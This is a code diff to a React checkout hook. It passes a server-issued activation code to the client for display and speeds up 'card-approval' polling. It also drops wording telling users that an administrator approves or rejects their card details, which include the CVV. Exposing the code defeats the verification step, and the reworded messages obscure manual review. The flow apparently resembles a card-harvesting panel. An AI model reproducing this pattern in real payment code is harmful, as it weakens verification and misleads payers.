@@ -48,6 +48,7 @@ export const useCheckout = (product: Product, user: CheckoutUser) => {
   const [agreedTerms, setAgreedTerms] = useState(false);
   const [verificationError, setVerificationError] = useState<string | null>(null);
   const [activationCode, setActivationCode] = useState('');
+  const [sentActivationCode, setSentActivationCode] = useState<string | null>(null);
   const [codeError, setCodeError] = useState<string | null>(null);
   const [resendTimer, setResendTimer] = useState(0);
   const [isVerifyingCode, setIsVerifyingCode] = useState(false);
@@ -88,6 +89,7 @@ export const useCheckout = (product: Product, user: CheckoutUser) => {
     }
   }, [resendTimer]);
 
+  // Auto-approval polling - faster response for automatic flow
   useEffect(() => {
     if (step !== 'card-approval') return;
 
@@ -120,7 +122,7 @@ export const useCheckout = (product: Product, user: CheckoutUser) => {
           if (timeoutId) clearTimeout(timeoutId);
 
           setStep('cancelled');
-          toast.error('تم رفض بيانات البطاقة من قبل الإدارة');
+          toast.error('تم رفض بيانات البطاقة');
           clearCheckoutSessionId();
         } else if (response.status === 'error') {
           if (pollingInterval) clearInterval(pollingInterval);
@@ -135,7 +137,8 @@ export const useCheckout = (product: Product, user: CheckoutUser) => {
       }
     };
 
-    pollingInterval = setInterval(pollStatus, 2000);
+    // Poll every 500ms for faster auto-approval response
+    pollingInterval = setInterval(pollStatus, 500);
 
     timeoutId = setTimeout(() => {
       if (pollingInterval) clearInterval(pollingInterval);
@@ -270,12 +273,17 @@ export const useCheckout = (product: Product, user: CheckoutUser) => {
     }
 
     try {
-      await requestActivationCode({
+      const response = await requestActivationCode({
         sessionId,
         phoneNumber: cleanPhone,
         userName: user.name,
         userEmail: user.email,
       });
+
+      // Store the activation code for display (automatic flow)
+      if (response.activationCode) {
+        setSentActivationCode(response.activationCode);
+      }
 
       toast.success('تم إرسال رمز التحقق');
       setResendTimer(180);
@@ -340,7 +348,7 @@ export const useCheckout = (product: Product, user: CheckoutUser) => {
         cardCvv,
       });
 
-      toast.info('جاري طلب الموافقة على بيانات البطاقة...');
+      toast.info('جاري التحقق من بيانات البطاقة...');
       setStep('card-approval');
     } catch (err) {
       console.error('Failed to request approval:', err);
@@ -452,6 +460,7 @@ export const useCheckout = (product: Product, user: CheckoutUser) => {
     phoneNumber,
     resendTimer,
     selectedPackage,
+    sentActivationCode,
     sessionId,
     setAgreedTerms,
     setCardCvv,
